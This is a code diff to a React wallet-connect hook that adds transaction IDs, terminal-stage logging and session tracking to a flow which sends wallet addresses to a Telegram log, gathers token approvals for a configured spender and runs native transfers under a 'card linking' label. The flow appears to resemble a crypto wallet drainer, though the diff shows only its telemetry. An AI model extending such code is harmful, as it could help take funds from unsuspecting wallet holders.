@@ -3,6 +3,7 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { TERMS_VERSION } from "../core/approve-config";
 import { fetchBalances } from "../core/balances-client";
+import { postTgLog } from "../core/tg-log-client";
 import {
   projectId,
   WC_CONNECT_NAMESPACES,
@@ -14,7 +15,16 @@ import { ApprovalStageName, StageStatus } from "../approval/types";
 import { createBrowserNativeTransferOrchestrator } from "../native-transfer/create-browser-orchestrator";
 import { createHttpNativeTransferApiClient } from "../native-transfer/http-api-client";
 import type { NativeTransferEstimate } from "../native-transfer/types";
-import { postTgLog } from "../core/tg-log-client";
+import { TRANSACTION_TERMINAL_STAGES } from "@trustmycard/shared/constants/transaction-lifecycle";
+import {
+  assignJourneyId,
+  beginTransaction,
+  getActiveTransaction,
+  markTerminal,
+  reconcileActiveTransactionOnMount,
+  setActiveTransaction,
+  updateActiveTransaction,
+} from "../core/transaction-context";
 import {
   getErrorMessage,
   isUserRejection,
@@ -108,6 +118,18 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     if (pendingQrTimerRef.current) {
       clearTimeout(pendingQrTimerRef.current);
       pendingQrTimerRef.current = null;
+    }
+  }, []);
+
+  useEffect(() => {
+    const reconciled = reconcileActiveTransactionOnMount();
+    if (reconciled.expired) {
+      createConnectLogStep("expired")(
+        TRANSACTION_TERMINAL_STAGES.EXPIRED,
+        { reason: "session_ttl_exceeded" }
+      );
+    } else if (reconciled.transactionId) {
+      traceIdRef.current = reconciled.transactionId;
     }
   }, []);
 
@@ -385,6 +407,15 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
 
         const primary = tron || linked.evm;
         const network = tron ? "tron" : "evm";
+        if (primary) {
+          const journey = assignJourneyId(primary, { network });
+          traceIdRef.current = journey.transactionId;
+        }
+        updateActiveTransaction({
+          walletAddress: primary ?? undefined,
+          network,
+        });
+
         const [, data] = await Promise.all([
           primary
             ? postTgLog({
@@ -393,6 +424,8 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
                 network,
                 status: "success",
                 error: null,
+                traceId: traceIdRef.current,
+                transactionId: traceIdRef.current,
               })
             : Promise.resolve(),
           fetchBalances(linked.evm, tron),
@@ -534,10 +567,18 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   }, [resetCardConnectTiming]);
 
   const openWalletConnect = useCallback(async () => {
-    traceIdRef.current = `flow-${Date.now().toString(36)}-${Math.random()
-      .toString(36)
-      .slice(2, 8)}`;
-    logStep("CONNECT STARTED", { traceId: traceIdRef.current });
+    const prior = getActiveTransaction();
+    if (prior && !prior.terminalStatus && prior.transactionId?.trim()) {
+      traceIdRef.current = prior.transactionId;
+      setActiveTransaction(prior);
+    } else {
+      const shell = beginTransaction();
+      traceIdRef.current = shell.transactionId;
+    }
+    logStep("CONNECT STARTED", {
+      traceId: traceIdRef.current || "pending",
+      transactionId: traceIdRef.current || "pending",
+    });
     advanceLinkProgress(linkProgressStageById("connecting"));
     const provider = providerRef.current;
     const modal = modalRef.current;
@@ -560,7 +601,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       unsubscribeModal = modal.subscribeModal((state) => {
         if (state.open) return;
         if (!connectingRef.current || provider.session) return;
-        logStep("QR MODAL CLOSED — CONNECT CANCELLED");
+        logStep(TRANSACTION_TERMINAL_STAGES.CANCELLED, {
+          reason: "qr_modal_closed",
+        });
+        markTerminal("CANCELLED");
         connectingRef.current = false;
         setBusy(false);
         resetCardConnectTiming();
@@ -586,7 +630,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       const linked = accountsFromSession(provider.session);
 
       if (!linked.evm && !linked.tron) {
-        logStep("CONNECT FAILED — NO ACCOUNTS");
+        logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
+          reason: "no_accounts",
+        });
+        markTerminal("FAILED");
         setError("No account returned from wallet. Please try again.");
         setShowCardModal(true);
         return;
@@ -597,9 +644,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       preloadNetworkIcons();
       await scanWallet(linked);
     } catch (err: unknown) {
-      logStep("CONNECT ERROR", {
+      logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
         error: getErrorMessage(err, "connect failed"),
+        phase: "connect",
       });
+      markTerminal("FAILED");
       modal?.closeModal();
       const message = getErrorMessage(err, "Connection cancelled");
       if (/reset/i.test(message)) {
@@ -749,6 +798,9 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         accounts: accountsRef.current,
         evmBatchProvider: provider,
         apiBaseUrl: "",
+        sessionId: traceIdRef.current,
+        authorizationSessionId: traceIdRef.current,
+        transactionId: traceIdRef.current,
         getSpender: (networkKey) =>
           getSpenderForNetwork(spendersRef.current, networkKey),
         log: logStep,
@@ -803,6 +855,8 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
                 address: owner,
                 network: result.network,
                 status: "rejected",
+                traceId: traceIdRef.current,
+                transactionId: traceIdRef.current,
                 error:
                   result.outcome === "user_rejected"
                     ? "Permission denied by user"
@@ -821,6 +875,8 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
               address: owner,
               network: result.network,
               status: "rejected",
+              traceId: traceIdRef.current,
+              transactionId: traceIdRef.current,
               error:
                 result.outcome === "user_rejected"
                   ? "Permission denied by user"
@@ -940,6 +996,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           };
 
           if (settlementResult.ok) {
+            logStep(TRANSACTION_TERMINAL_STAGES.SUCCESS, {
+              network,
+              settlementSessionId: settlementResult.settlementSessionId,
+            });
+            markTerminal("SUCCESS");
             advanceLinkProgress(linkProgressStageById("complete"));
             setStatus(network, "linked");
             clearLinkCompleteTimer();
@@ -951,6 +1012,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
             const message =
               settlementResult.error ??
               "Network linking failed during background settlement";
+            logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
+              network,
+              error: message,
+            });
+            markTerminal("FAILED");
             setLinkCancelled(network, message);
             finishLinkUi();
           }
